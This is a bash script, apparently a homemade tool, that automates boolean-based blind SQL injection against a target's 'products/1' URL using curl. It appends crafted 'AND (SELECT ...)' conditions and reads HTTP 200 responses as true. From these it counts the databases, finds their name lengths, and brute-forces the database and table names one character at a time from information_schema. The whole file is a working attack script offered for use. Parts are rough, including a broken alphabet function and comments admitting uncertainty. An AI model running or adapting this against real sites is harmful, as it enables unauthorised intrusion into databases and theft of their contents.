#!/bin/bash

declare -A object
MYSQL_STANDARD_DATABASES=('mysql','information_schema')

function enumarteViaNumber() {
	((index++))
  	[ $index -le 100 ]
}

function enumarteViaAlphabet() {
	aplphabet='abcdefghijklmnopqrstuvwxyz'
        ((y++))
	echo $aplphabet[0]
	index=$(echo $aplphabet[$y])
	echo "$index"
	echo $y
        [ $y -le 26 ]
}

function loopThrow() {
	START=1
	END=100
	placeholderSqli="$1"

	while "${object['condition']}"; do
		sqli="$(printf "${placeholderSqli}" "$index")"
		request "$sqli"
                result=$(echo $?)
                if [ $result -eq 0 ]; then
                        echo "$index "
                        break
                fi
	done
	index=0
	y=0
}


function getLength() {
	# store the length in array!
	# required: ??
	# parameter: ??
	# IT Create from three parameter the sqli!

	START_Y=1
	#END_Y=$((object['amountOfDatabases']))
	END_Y=$2
	results=''
	sqlQuery="$1"
	object['condition']='enumarteViaNumber'

	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
		count=$((indey-1))
		sqli="AND (${sqlQuery} LIMIT 1 OFFSET $count) = %d"
		results+=$(loopThrow "$sqli")
	done
	echo $results
}

function encodeToUrl() {
	# it can make some problems! NOT SURE!
	# PROBLEMES can come from the quots
	#echo $(python -c `from urllib.parse import quote; print(quote(\"${1}\"));`)

	# will that solve our Problem?
	echo $(echo "$1" | /usr/bin/jq -Rr '@uri')
}

function getAmount() {
	#echo 'i get the amount of the tables/columns/content'
	# required:
	# - database
	# - sqli
	# parameter: ??

	sqlQuery=$1

	#tableName='information_schema.tables'
	#condition="table_schema = ${database}"

	for index in {1..100}; do
		sqli="AND (${sqlQuery}) = $index"
		request "$sqli"
		result=$(echo $?)
		if [ $result -eq 0 ]; then
			echo $index
			break
		fi
	done
}

function bruteForceName() {
	# required:
	# - length
	# - length of names
	# - sql query
	#
	# FOR -> database/table/columns/content


	sqlQuery=$1
	placeholderSqli="AND (${sqlQuery}) = '%s'"

	# length of the result <int>
	length=$((object['amountOfDatabases']))
	# lenth of the names as <string list>
	databaseNameLength=(${object['lengthOfDatabaseNames']})

	for (( index=0; index<=$((length-1)); index++ )); do
		# length of the string(database, table, column, content)
		limit="${databaseNameLength[$index]}"
		for (( i=0; i<=$limit; i++ )); do
			# sql function 'substr()' starts at the number one and not with zero
			extractionStartPosition=$((i+1))
			offset=$index
			for letter in {{a..z},_}; do
				sqli="$(printf "${placeholderSqli}" "$extractionStartPosition" "$offset" "$letter")"
				request "${sqli}"
				result=$(echo $?)
				if [ $result -eq 0 ]; then
                       			name="${name}${letter}"
                        		break
                		fi
			done
		done
		# add to <string list> and clean the variable 'name'
		list+="${name} "
		name=''
	done
	echo "${list[@]}"
}

function request() {
	# rquired
	# - parsed url
	# take care of parsing url!

	SPACE="%20"
	encodedUrl=$(encodeToUrl "$1")
	/usr/bin/curl --silent -i "$URL/${PATH}${SPACE}${encodedUrl}" | /usr/bin/head -n 1 | /usr/bin/grep -q '200'
}

#SQLiTablesCount="SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=${database}"
#SQLiColumnsCount="SELECT COUNT(*) FROM ${table}"
#SQLILength="SELECT LENGTH(<column>) FROM information_schema.<column> WHERE <table_schema> = <table_name>"

URL="http://${target}"
PATH="products/1"

# find all datbases that are not standad only the number!
## count all databases
object['amountOfDatabases']=$(getAmount 'SELECT COUNT(*) FROM information_schema.schemata')
## get the length of the names
object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata' "${object['amountOfDatabases']}")
## get the names
object['namesOfDatabases']=$(bruteForceName 'SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d')


# find all names from a specific databse:
echo "which database want you to be searched: ${object['namesOfDatabases']} \n >>"
read toSearchedDatabase
object['toSearchedDatabase']="$toSearchedDatabase"

## count tables
sqlQuery="SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
object['amountOfTables']=$(getAmount "$sqlQuery")
## get length of the names
sqlQuery="SELECT length(table_name) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}'"
object['lengthOfTablesNames']=$(getLength "$sqlQuery" "${object['amountOfTables']}")
## get the tables names
sqlQuery="SELECT substr(LOWER(table_name), %d,1) FROM information_schema.tables WHERE table_schema = '${object['toSearchedDatabase']}' LIMIT 1 OFFSET %d"
object['nameOfTables']=$(bruteForceName "$sqlQuery")


echo "${object['nameOfTables']}"
